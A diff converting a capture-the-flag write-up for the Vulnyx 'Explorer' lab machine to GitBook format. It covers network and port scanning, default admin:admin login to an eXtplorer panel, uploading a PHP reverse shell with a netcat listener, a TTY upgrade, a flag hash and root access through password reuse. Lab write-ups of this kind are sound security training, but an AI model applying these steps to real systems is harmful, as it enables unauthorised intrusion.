@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Explorer 
+---
+icon: linux
+---
 
-**Platform:** Vulnyx  
-**Operating System:** Linux  
+# Explorer ​
+
+## 🖥️ Writeup - Explorer
+
+**Platform:** Vulnyx\
+**Operating System:** Linux
 
 > **Tags:** `Linux` `Robots.txt` `Default Credentials` `File Upload` `Reverse Shell` `Password Reuse`
 
-# INSTALLATION
+## INSTALLATION
 
 We download the `zip` containing the `.ova` of the Explorer machine, extract it, and import it into VirtualBox.
 
 We configure the network interface of the Explorer machine and run it alongside the attacker machine.
 
-# HOST DISCOVERY
+## HOST DISCOVERY
 
 At this point, we still don’t know which `IP` address is assigned to Explorer, so we discover it as follows:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,22 +38,24 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:1c:29:88      1      60  PCS Systemtechnik GmbH      
  10.0.4.22       08:00:27:a0:a2:05      1      60  PCS Systemtechnik GmbH
- ```
+```
 
 We identify with high confidence that the victim’s IP is `10.0.4.22`.
 
-# PORT SCANNING
+## PORT SCANNING
 
 Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.22
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.22
 ```
+
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 14:42 CEST
 Nmap scan report for 10.0.4.22
@@ -74,13 +84,13 @@ We access the web service over `HTTP`, the server is running but there is no con
 
 The scan reveals a `robots.txt` file, and it contains a Disallow entry for `/extplorer`.
 
-![alt text](../../images/robots.png)
+![alt text](../../.gitbook/assets/robots.png)
 
 Encontramos una disallowed entry, un directorio llamado /extplorer.
 
 We navigate to `/extplorer` and encounter a `login` page.
 
-![alt text](../../images/loginex.png)
+![alt text](../../.gitbook/assets/loginex.png)
 
 We try common/default credentials such as `admin` : `admin`.
 
@@ -88,7 +98,7 @@ The default credentials work, so we log in to an admin panel that appears to be 
 
 We upload a `PHP` reverse shell (PentestMonkey’s `php-reverse-shell`).
 
-![alt text](../../images/revvshell.png)
+![alt text](../../.gitbook/assets/revvshell.png)
 
 Before any further action, we start a `listener` on our attacker machine.
 
@@ -99,6 +109,7 @@ sudo nc -nlvp 4444
 We now execute the uploaded file at `http://10.0.4.22/shell.php` and obtain a `reverse shell` as user `www-data`.
 
 Info:
+
 ```
 connect to [10.0.4.12] from (UNKNOWN) [10.0.4.22] 60142
 Linux explorer 6.1.0-39-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.148-1 (2025-08-26) x86_64 GNU/Linux
@@ -119,28 +130,33 @@ In `/home` we find the `user flag`.
 3f2580ab16ac82c9e0adaf0dad3a900d
 ```
 
-# TTY
+## TTY
 
 Before attempting privilege escalation, we upgrade the `TTY` for a more interactive shell:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# PRIVILEGE ESCALATION
+## PRIVILEGE ESCALATION
 
 We check for `sudo` privileges, `SUID` binaries, and Linux `capabilities`.
 
@@ -165,6 +181,7 @@ su root
 ```
 
 Info:
+
 ```
 root@explorer:/var/www/html/extplorer/config# whoami
 root
